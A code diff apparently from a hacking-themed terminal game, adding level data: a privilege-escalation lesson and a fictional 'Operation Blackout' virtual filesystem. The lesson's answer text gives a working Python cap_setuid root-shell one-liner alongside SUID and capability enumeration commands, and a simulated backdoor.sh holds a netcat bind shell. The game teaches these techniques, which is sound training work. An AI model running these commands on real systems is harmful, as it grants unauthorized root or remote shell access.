@@ -6739,6 +6739,31 @@ End-Date: 2026-01-15  02:51:10`
             },
 
             remoteHosts: null,
+
+            // System packages for dpkg command - includes suspicious packages for forensic analysis
+            packages: [
+                { name: 'apache2',        version: '2.4.54',   arch: 'amd64', desc: 'Apache HTTP Server' },
+                { name: 'bash',           version: '5.1-6',    arch: 'amd64', desc: 'GNU Bourne Again Shell' },
+                { name: 'coreutils',      version: '8.32-4',   arch: 'amd64', desc: 'GNU core utilities' },
+                { name: 'curl',           version: '7.81.0',   arch: 'amd64', desc: 'Command line URL tool' },
+                { name: 'dpkg',           version: '1.21.1',   arch: 'amd64', desc: 'Debian package manager' },
+                { name: 'grep',           version: '3.7-1',    arch: 'amd64', desc: 'GNU grep' },
+                { name: 'htop',           version: '3.2.1',    arch: 'amd64', desc: 'Interactive process viewer' },
+                { name: 'libc6',          version: '2.35-0',   arch: 'amd64', desc: 'GNU C Library' },
+                { name: 'libssl3',        version: '3.0.2-0',  arch: 'amd64', desc: 'SSL shared libraries' },
+                { name: 'mysql-client',   version: '8.0.32',   arch: 'amd64', desc: 'MySQL client' },
+                { name: 'ncat',           version: '7.93',     arch: 'amd64', desc: 'Nmap network tool' },
+                { name: 'netminer',       version: '0.9.7',    arch: 'amd64', desc: 'Network utility' },
+                { name: 'nginx',          version: '1.22.1',   arch: 'amd64', desc: 'HTTP and reverse proxy' },
+                { name: 'openssh-server', version: '8.9p1',    arch: 'amd64', desc: 'Secure shell server' },
+                { name: 'openssl',        version: '3.0.2-0',  arch: 'amd64', desc: 'SSL toolkit' },
+                { name: 'php8.1',         version: '8.1.12',   arch: 'amd64', desc: 'PHP interpreter' },
+                { name: 'rsync',          version: '3.2.3-8',  arch: 'amd64', desc: 'Fast file copy' },
+                { name: 'socat',          version: '1.7.4.1',  arch: 'amd64', desc: 'Multipurpose relay' },
+                { name: 'tar',            version: '1.34-1',   arch: 'amd64', desc: 'GNU tar' },
+                { name: 'vim',            version: '8.2.3995', arch: 'amd64', desc: 'Vi IMproved' },
+                { name: 'wget',           version: '1.21.2',   arch: 'amd64', desc: 'Network downloader' },
+            ],
         },
 
         // ──────────────────────────────────────────────────────────
@@ -6995,34 +7020,62 @@ Reason: Direct, no file modification needed`
             },
 
             objectives: [
-                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups',
-                  check: (cmd, state, output) => (cmd.includes('id') || cmd.includes('groups') || cmd.includes('whoami')) &&
-                         output && (output.includes('infiltrator') || output.includes('uid=') || output.includes('gid=')) },
-                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null',
-                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
-                         output && (output.includes('/usr/bin') || output.includes('suid') || output.includes('backup')) },
-                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l',
+                { id: 1, task: 'RECON: Confirm your access level', hint: 'Who are you? What groups? → id',
+                  check: (cmd, state, output) => cmd.includes('id') &&
+                         output && (output.includes('uid=') || output.includes('infiltrator')) },
+                { id: 2, task: 'ENUM: Check what you can sudo', hint: 'What commands can you run as root? → sudo -l',
                   check: (cmd, state, output) => cmd.includes('sudo') && cmd.includes('-l') &&
-                         output && (output.includes('NOPASSWD') || output.includes('may run') || output.includes('python')) },
-                { id: 4, task: 'FIND: World-Writable Files', hint: '$ find / -perm -o+w -type f 2>/dev/null',
-                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && (cmd.includes('w') || cmd.includes('777')) &&
-                         output && (output.includes('/opt') || output.includes('/tmp') || output.includes('writable')) },
-                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null',
+                         output && (output.includes('NOPASSWD') || output.includes('may run')) },
+                { id: 3, task: 'ENUM: Scan for dangerous capabilities', hint: 'Capabilities can bypass permissions → getcap -r / 2>/dev/null',
                   check: (cmd, state, output) => cmd.includes('getcap') &&
-                         output && (output.includes('cap_') || output.includes('python') || output.includes('setuid')) },
+                         output && output.includes('cap_') },
+                { id: 4, task: 'ANALYZE: Read the recon notes', hint: 'Previous recon is in ~/recon/ and ~/privesc_notes/',
+                  check: (cmd, state, output) => cmd.includes('cat') &&
+                         (cmd.includes('capabilities') || cmd.includes('sudo_rules') || cmd.includes('attack_plan')) &&
+                         output && output.length > 50 },
+                { id: 5, task: 'IDENTIFY: Find the easiest escalation path', hint: 'Which binary has cap_setuid? Check ~/exploits/attack_plan.txt',
+                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('attack_plan') &&
+                         output && output.includes('cap_setuid') },
             ],
 
             insightPhase: {
                 enabled: true,
-                question: "Which binary has the cap_setuid capability that allows direct privilege escalation?",
+                question: "Your getcap scan found a binary with cap_setuid=ep. This capability allows a program to change its user ID to ANY user - including root (UID 0). Which binary has this dangerous capability?",
                 acceptedAnswers: ["python3", "python3.10", "/usr/bin/python3", "/usr/bin/python3.10", "python"],
-                hint: "Check the capabilities.txt file in the recon directory, or run getcap to find binaries with dangerous capabilities.",
-                hintAfterAttempts: 3,
-                wrongAnswerMessage: "Not quite. Look for a binary with cap_setuid=ep capability.",
-                correctAnswerMessage: "CONFIRMED. Python3.10 has cap_setuid - instant root with: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+                hint: "Run: getcap -r / 2>/dev/null — look for 'cap_setuid=ep' in the output.",
+                hintAfterAttempts: 2,
+                wrongAnswerMessage: "Check your getcap output or ~/recon/capabilities.txt for the binary with cap_setuid.",
+                correctAnswerMessage: "CORRECT. Python3.10 has cap_setuid, meaning it can set its UID to 0 (root). Exploitation: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' — This gives instant root shell without needing sudo or SUID bits."
             },
 
             remoteHosts: null,
+
+            // Privilege escalation config for security commands
+            sudoRules: `User infiltrator may run the following commands on EMBASSY-SRV:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
+    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log`,
+
+            suidBinaries: [
+                '/usr/bin/passwd',
+                '/usr/bin/sudo',
+                '/usr/bin/su',
+                '/usr/bin/mount',
+                '/usr/bin/ping',
+                '/usr/bin/find',
+                '/usr/bin/vim',
+                '/usr/local/bin/backup',
+            ],
+
+            writableFiles: [
+                '/opt/scripts/report.py',
+                '/var/tmp/cleanup.sh',
+                '/tmp/session_data.txt',
+                '/var/log/app.log',
+            ],
+
+            capabilities: `/usr/bin/python3.10 cap_setuid=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep`,
         },
 
         // ──────────────────────────────────────────────────────────
@@ -8447,8 +8500,408 @@ backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
                 enabled: false, // Victory modal handles completion
             },
 
-            filesystem: null, // Custom module with embedded virtual FS
-            remoteHosts: null,
+            filesystem: {
+                // ══════════════════════════════════════════════════════════════
+                // ROOT FILESYSTEM - OPERATION BLACKOUT
+                // ══════════════════════════════════════════════════════════════
+
+                '/': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['home', 'data', 'var', 'etc', 'tmp', 'opt', 'usr']
+                },
+
+                // ──────────────────────────────────────────────────────────────
+                // HOME DIRECTORIES
+                // ──────────────────────────────────────────────────────────────
+
+                '/home': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['operator', 'specter', 'admin']
+                },
+
+                '/home/operator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['.bashrc', '.ssh', 'Documents', 'Downloads', 'intel.classified', 'mission_notes.txt']
+                },
+
+                '/home/operator/.bashrc': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                    content: `# .bashrc - operator terminal config
+alias ll='ls -la'
+alias cls='clear'
+export PS1='\\u@\\h:\\w\\$ '`
+                },
+
+                '/home/operator/.ssh': {
+                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
+                    children: ['known_hosts', 'id_rsa', 'id_rsa.pub']
+                },
+
+                '/home/operator/.ssh/known_hosts': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                    content: `prometheus,10.13.37.50 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
+relay,10.13.37.100 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...`
+                },
+
+                '/home/operator/.ssh/id_rsa': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator',
+                    content: `-----BEGIN RSA PRIVATE KEY-----
+[ENCRYPTED - PASSPHRASE REQUIRED]
+-----END RSA PRIVATE KEY-----`
+                },
+
+                '/home/operator/.ssh/id_rsa.pub': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                    content: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... operator@relay`
+                },
+
+                '/home/operator/Documents': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: []
+                },
+
+                '/home/operator/Downloads': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: []
+                },
+
+                '/home/operator/intel.classified': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator',
+                    content: `═══════════════════════════════════════
+TOP SECRET // OPERATION BLACKOUT
+TARGET: SPECTER-7 - NEUTRALIZE
+LOCATION: Node 7-ALPHA
+STATUS: ACTIVE THREAT
+═══════════════════════════════════════`
+                },
+
+                '/home/operator/mission_notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                    content: `OPERATION BLACKOUT - Field Notes
+================================
+- Primary target: PROMETHEUS server
+- Hostile: SPECTER (10.13.37.66)
+- Objective: Extract intel before SPECTER
+- Watch for traps and decoys
+- Time is critical`
+                },
+
+                '/home/specter': {
+                    type: 'dir', perms: 'drwx------', owner: 'specter', group: 'specter',
+                    children: ['.hidden', 'plans.txt']
+                },
+
+                '/home/specter/.hidden': {
+                    type: 'dir', perms: 'drwx------', owner: 'specter', group: 'specter',
+                    children: ['backdoor.sh', 'exfil.py']
+                },
+
+                '/home/specter/.hidden/backdoor.sh': {
+                    type: 'file', perms: '-rwx------', owner: 'specter', group: 'specter',
+                    content: `#!/bin/bash
+# SPECTER persistence mechanism
+nc -lvp 4444 -e /bin/bash &`
+                },
+
+                '/home/specter/.hidden/exfil.py': {
+                    type: 'file', perms: '-rwx------', owner: 'specter', group: 'specter',
+                    content: `#!/usr/bin/env python3
+# Data exfiltration tool
+import socket, os
+# [REDACTED]`
+                },
+
+                '/home/specter/plans.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'specter', group: 'specter',
+                    content: `Phase 1: Infiltrate PROMETHEUS
+Phase 2: Extract classified data
+Phase 3: Cover tracks
+Phase 4: Destroy evidence`
+                },
+
+                '/home/admin': {
+                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
+                    children: []
+                },
+
+                // ──────────────────────────────────────────────────────────────
+                // DATA DIRECTORY - Mission Critical Intel
+                // ──────────────────────────────────────────────────────────────
+
+                '/data': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['ops', 'logs', 'backups']
+                },
+
+                '/data/ops': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'operator',
+                    children: ['mission_intel.classified', 'targets.list', 'creds.enc']
+                },
+
+                '/data/ops/mission_intel.classified': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'operator',
+                    content: `═══════════════════════════════════════
+TOP SECRET // OPERATION BLACKOUT
+═══════════════════════════════════════
+TARGET: SPECTER-7 - NEUTRALIZE
+LOCATION: Node 7-ALPHA
+STATUS: ACTIVE THREAT
+
+INTEL SUMMARY:
+- SPECTER has compromised multiple nodes
+- Origin IP: 10.13.37.66
+- Method: SSH brute force + credential stuffing
+- Current activity: Data exfiltration in progress
+
+RECOMMENDED ACTION:
+1. Terminate all SPECTER processes
+2. Block origin IP at firewall
+3. Rotate all credentials
+4. Preserve logs for forensics
+═══════════════════════════════════════`
+                },
+
+                '/data/ops/targets.list': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
+                    content: `# Priority Targets - OPERATION BLACKOUT
+10.13.37.50    PROMETHEUS    [PRIMARY]
+10.13.37.51    ATLAS         [SECONDARY]
+10.13.37.66    SPECTER       [HOSTILE]
+10.13.37.100   RELAY         [FRIENDLY]`
+                },
+
+                '/data/ops/creds.enc': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'operator',
+                    content: `[AES-256 ENCRYPTED]
+U2FsdGVkX1+vupppZksvRf5pq...
+[REQUIRES KEY FROM HANDLER]`
+                },
+
+                '/data/logs': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['access.log', 'security.log']
+                },
+
+                '/data/logs/access.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `2024-01-31 08:14:22 operator LOGIN success from 10.13.37.100
+2024-01-31 08:15:27 specter LOGIN success from 10.13.37.66
+2024-01-31 08:16:45 specter ACCESS /data/ops/mission_intel.classified
+2024-01-31 08:17:02 specter DOWNLOAD initiated`
+                },
+
+                '/data/logs/security.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `[ALERT] Multiple failed login attempts detected
+[ALERT] Suspicious activity from 10.13.37.66
+[ALERT] Unauthorized access attempt to /data/ops
+[CRITICAL] Data exfiltration in progress`
+                },
+
+                '/data/backups': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'operator',
+                    children: ['system.tar.gz', 'users.bak']
+                },
+
+                '/data/backups/system.tar.gz': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
+                    content: `[BINARY DATA - COMPRESSED ARCHIVE]`
+                },
+
+                '/data/backups/users.bak': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
+                    content: `root:x:0:0:root:/root:/bin/bash
+operator:x:1000:1000::/home/operator:/bin/bash
+admin:x:1001:1001::/home/admin:/bin/bash`
+                },
+
+                // ──────────────────────────────────────────────────────────────
+                // VAR DIRECTORY - Logs
+                // ──────────────────────────────────────────────────────────────
+
+                '/var': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['log', 'run', 'tmp']
+                },
+
+                '/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['auth.log', 'syslog', 'messages', 'secure', 'daemon.log']
+                },
+
+                '/var/log/auth.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
+                    content: `Jan 31 08:15:22 prometheus sshd: Failed password for root from 10.13.37.66
+Jan 31 08:15:24 prometheus sshd: Failed password for root from 10.13.37.66
+Jan 31 08:15:27 prometheus sshd: Accepted password for specter from 10.13.37.66
+Jan 31 08:16:01 prometheus sshd: Connection from 10.13.37.100 authorized
+Jan 31 08:16:15 prometheus sshd: Accepted publickey for operator from 10.13.37.100
+Jan 31 08:17:33 prometheus sudo: specter : TTY=pts/1 ; PWD=/data/ops ; COMMAND=/bin/cat mission_intel.classified`
+                },
+
+                '/var/log/syslog': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
+                    content: `Jan 31 08:14:00 prometheus systemd: Started OpenSSH server daemon.
+Jan 31 08:15:00 prometheus kernel: [UFW BLOCK] IN=eth0 SRC=10.13.37.66 DST=10.13.37.50 PROTO=TCP DPT=22
+Jan 31 08:15:25 prometheus kernel: [UFW ALLOW] IN=eth0 SRC=10.13.37.66 DST=10.13.37.50 PROTO=TCP DPT=22
+Jan 31 08:16:00 prometheus systemd: Session opened for user operator`
+                },
+
+                '/var/log/messages': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
+                    content: `Jan 31 08:14:00 prometheus: System boot complete
+Jan 31 08:15:30 prometheus: WARNING - Multiple authentication failures
+Jan 31 08:16:00 prometheus: ALERT - Unusual process activity detected`
+                },
+
+                '/var/log/secure': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
+                    content: `Jan 31 08:15:22 prometheus sshd[1337]: Failed password for root
+Jan 31 08:15:24 prometheus sshd[1337]: Failed password for root
+Jan 31 08:15:27 prometheus sshd[1338]: Accepted password for specter
+Jan 31 08:16:01 prometheus sshd[1339]: Accepted publickey for operator`
+                },
+
+                '/var/log/daemon.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
+                    content: `Jan 31 08:14:00 prometheus sshd[1000]: Server listening on 0.0.0.0 port 22
+Jan 31 08:14:00 prometheus cron[1001]: (CRON) INFO (Running @reboot jobs)`
+                },
+
+                '/var/run': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['sshd.pid', 'utmp']
+                },
+
+                '/var/run/sshd.pid': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `1000`
+                },
+
+                '/var/run/utmp': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `[BINARY - Active user sessions]`
+                },
+
+                '/var/tmp': {
+                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
+                    children: []
+                },
+
+                // ──────────────────────────────────────────────────────────────
+                // ETC DIRECTORY - System Configuration
+                // ──────────────────────────────────────────────────────────────
+
+                '/etc': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['passwd', 'shadow', 'hosts', 'hostname', 'network', 'ssh']
+                },
+
+                '/etc/passwd': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+operator:x:1000:1000::/home/operator:/bin/bash
+specter:x:1001:1001::/home/specter:/bin/bash
+admin:x:1002:1002::/home/admin:/bin/bash`
+                },
+
+                '/etc/shadow': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'shadow',
+                    content: `root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
+operator:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
+specter:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
+admin:$6$rounds=5000$salt$hash...:19000:0:99999:7:::`
+                },
+
+                '/etc/hosts': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `127.0.0.1       localhost
+10.13.37.50     prometheus
+10.13.37.100    relay
+10.13.37.66     specter-origin  # HOSTILE`
+                },
+
+                '/etc/hostname': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `RELAY`
+                },
+
+                '/etc/network': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['interfaces']
+                },
+
+                '/etc/network/interfaces': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet static
+    address 10.13.37.100
+    netmask 255.255.255.0
+    gateway 10.13.37.1`
+                },
+
+                '/etc/ssh': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['sshd_config', 'ssh_host_rsa_key.pub']
+                },
+
+                '/etc/ssh/sshd_config': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `# SSH Server Configuration
+Port 22
+PermitRootLogin no
+PasswordAuthentication yes
+PubkeyAuthentication yes
+MaxAuthTries 3`
+                },
+
+                '/etc/ssh/ssh_host_rsa_key.pub': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                    content: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... root@relay`
+                },
+
+                // ──────────────────────────────────────────────────────────────
+                // OTHER DIRECTORIES
+                // ──────────────────────────────────────────────────────────────
+
+                '/tmp': {
+                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
+                    children: []
+                },
+
+                '/opt': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: []
+                },
+
+                '/usr': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['bin', 'local']
+                },
+
+                '/usr/bin': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: []
+                },
+
+                '/usr/local': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: []
+                }
+            },
+
+            remoteHosts: {
+                'prometheus': {
+                    hostname: 'PROMETHEUS',
+                    ip: '10.13.37.50',
+                    user: 'operator',
+                    filesystem: 'inherit' // Uses same filesystem structure
+                }
+            },
         },
 
         // ══════════════════════════════════════════════════════════════════════════
